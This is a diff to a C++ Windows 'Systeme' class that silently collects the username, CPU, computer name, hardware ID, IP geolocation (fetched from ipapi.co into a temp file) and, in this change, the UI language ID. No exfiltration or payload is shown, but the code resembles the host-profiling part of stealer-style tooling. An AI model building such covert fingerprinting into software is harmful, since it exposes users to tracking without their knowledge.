@@ -2,8 +2,14 @@
 #pragma warning(disable: 6387)
 #pragma comment(lib, "urlmon.lib")
 
+#include <iostream>
+#include <vector>
+#include <fstream>
+#include <Lmcons.h>
+#include <intrin.h>
 
 #include "systeme.h"
+#include "headers.h"
 
 
 bool Systeme::setUsername() {
@@ -89,7 +95,7 @@ bool Systeme::setHwId() {
 	std::cerr << "0x" << &_HwId << " Unallocated Buffer :  _HwId" << std::endl;
 #endif
 	return false;
-}
+} 
 
 bool Systeme::setLocalization() {
 	const char* baseUrl = "https://ipapi.co/";
@@ -98,7 +104,7 @@ bool Systeme::setLocalization() {
 		char buff[0x64];
 		strcpy_s(buff, baseUrl);
 		strcat_s(buff, endpoints[i]);
-		HRESULT hResult = URLDownloadToFileA(NULL, buff, (TEMPFILE), 0, NULL);
+		HRESULT hResult = URLDownloadToFileA(NULL, buff, TEMPFILE, 0, NULL);
 		std::ifstream file(TEMPFILE);
 		if (file.is_open()) {
 			std::string line;
@@ -113,6 +119,19 @@ bool Systeme::setLocalization() {
 	std::clog << "0x" << &_dataLocalization << " Allocated Buffer :  _dataLocalization " << _dataLocalization << std::endl;
 #endif
 	return true;
+}
+
+bool Systeme::setlangId() {
+
+	_langid = GetUserDefaultUILanguage();
+#if DEBUG
+	std::clog << "0x" << &_langid << " Allocated Buffer :  _langid " << _langid << std::endl;
+#endif
+	return true;
+}
+
+LANGID Systeme::getLangId() {
+	return _langid;
 }
 
 std::string Systeme::getLocalization() {
@@ -146,6 +165,7 @@ char* Systeme::getCPU() {
 Systeme::Systeme() {
 	setUsername();
 	setCPU();
+	setlangId();
 	setComputerName();
 	setHwId();
 	setLocalization();
